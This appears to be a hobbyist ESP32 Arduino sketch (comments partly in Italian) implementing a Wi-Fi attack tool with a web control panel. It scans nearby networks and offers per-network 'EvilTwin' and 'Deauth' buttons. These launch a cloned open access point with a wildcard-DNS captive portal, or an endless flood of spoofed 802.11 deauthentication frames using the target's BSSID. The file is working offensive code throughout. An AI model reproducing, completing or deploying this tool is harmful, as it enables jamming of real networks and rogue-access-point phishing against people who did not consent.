

#include <Arduino.h>

#include "bypass.h"

#include <DNSServer.h>
#include <HTTP_Method.h>
#include <Middlewares.h>
#include <Uri.h>
#include <WebServer.h>

#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiClient.h>
#include <WiFiGeneric.h>
#include <WiFiMulti.h>
#include <WiFiSTA.h>
#include <WiFiScan.h>
#include <WiFiServer.h>
#include <WiFiType.h>
#include <WiFiUdp.h>

#include "esp_wifi.h"

//struct network beacon packet
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 };
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

#define AP_NAME "M#TE"
#define AP_PASSWD "tryhackme123456"

#define MAX_NETWORKS 10

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer server(80);

_Network networks[MAX_NETWORKS];

deauth_frame_t deauth_frame;

void scanForNetworks(_Network * networks){

  int numberOfNetworks = WiFi.scanNetworks();

  if(numberOfNetworks>0){

    for(int i = 0; i<MAX_NETWORKS && i<numberOfNetworks; i++){

      _Network net;
      net.ssid = WiFi.SSID(i);
      for(int j = 0; j<6; j++){

        net.bssid[j] = WiFi.BSSID(i)[j];

      }

      net.ch = WiFi.channel(i);

      networks[i] = net;
    }

  }

}

bool spoofMac(uint8_t mac[]){

  esp_wifi_stop();  // Ferma Wi-Fi prima di cambiare MAC
  esp_err_t result = esp_wifi_set_mac(WIFI_IF_AP, mac);
  esp_wifi_start(); // Riavvia il Wi-Fi

  return (result == ESP_OK) ? true : false;

}

void captivePortal(){

  String page = "<html><body> Captive Portal </body></html>";

  server.send(200, "text/html", page);

}


esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

void start_deauth(_Network wifi) {

  deauth_frame.reason = 5;

  Serial.println("Starting Deauth-Attack on network");
  Serial.println(wifi.ssid);

  WiFi.softAP(wifi.ssid, "", wifi.ch);
  memcpy(deauth_frame.access_point, wifi.bssid, 6);
  memcpy(deauth_frame.sender, wifi.bssid, 6);
  esp_wifi_set_promiscuous(true);

  while(true){

    esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

  }

}


void indexPage(){

  //pagina html
  String page="<html><head><title>Chippin' in!</title><style>body {background-color: black;color: white;max-width: 100%;margin: auto;font-family: Arial, sans-serif;padding: 20px;box-sizing: border-box;}#author {font-family: 'Courier New', Courier, monospace;text-align: center;margin-bottom: 20px;}table {width: 100%;border-collapse: collapse;margin: 20px 0;}th, td {border: 1px solid green;padding: 8px;text-align: left;}th {background-color: #333;}input[type='submit'] {cursor: pointer;background-color: black;color: white;border: 1px solid green;padding: 5px 10px;text-transform: uppercase;font-weight: bold;}@media (max-width: 768px) {table, th, td {font-size: 14px;}}@media (max-width: 480px) {table {font-size: 12px;}th, td {padding: 6px;}#author {font-size: 16px;}input[type='submit'] {width: 100%;padding: 10px;font-size: 16px;}}</style></head><body><pre id='author'>______  _________ ___________________\n___   |/  /___/ // /___  __/__  ____/\n__  /|_/ /_ _  _  __/_  /  __  __/   \n_  /  / / /_  _  __/_  /   _  /___   \n/_/  /_/   /_//_/   /_/    /_____/   </pre><table><tr><th>Network SSID</th><th>Select Network</th></tr>"; 

  //passa l'indirizzo dell'array e lo riempie con i dati dei networks circostanti
  scanForNetworks(networks);


  for(int i=0; i<MAX_NETWORKS; i++){

    char index[5];
    itoa(i, index, 10);

    page+= "<tr><td>"+networks[i].ssid+"</td>";
    page+= "<td><form action='/step2' method='get'><input type='hidden' name='networkId' value='"+((String) index)+"'><input type='submit' name='ev' value='EvilTwin'></form></td>";
    page+= "<td><form action='/step2' method='get'><input type='hidden' name='networkId' value='"+((String) index)+"'><input type='submit' name='da' value='Deauth'></form></td></tr>";

  }

  page+="</table></body></html>";

  //invio la risposta
  server.send(200, "text/html", page);

}


void attack(){

  char buffer[60];
  int index;

  if(server.hasArg("networkId")){

    strncpy(buffer, server.arg("networkId").c_str(), sizeof(buffer));
    
    index = atoi(buffer);

    if(server.hasArg("ev")){

      // if(spoofMac(networks[index].bssid)){

      //   Serial.println("MAC Spoofing riuscito");

      // }
      // else{

      //   Serial.println("Errore durante lo spoofing del MAC");

      // }

      Serial.println("Starting Evil Twin on network");
      Serial.println(networks[index].ssid);

      WiFi.mode(WIFI_AP_STA);
      //                IP address                  gw IP address               subnetmask
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(networks[index].ssid, "", (int) networks[index].ch);

      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

      server.on("/", captivePortal);
      server.onNotFound(captivePortal);
      server.begin();

    }
    if(server.hasArg("da")){

      start_deauth(networks[index]);

    }

  }

}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  //                IP address                  gw IP address               subnetmask
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_NAME, AP_PASSWD);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  server.on("/", indexPage);
  server.on("/step2", attack);
  server.onNotFound(indexPage);
  server.begin();

}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  // put your main code here, to run repeatedly:

}
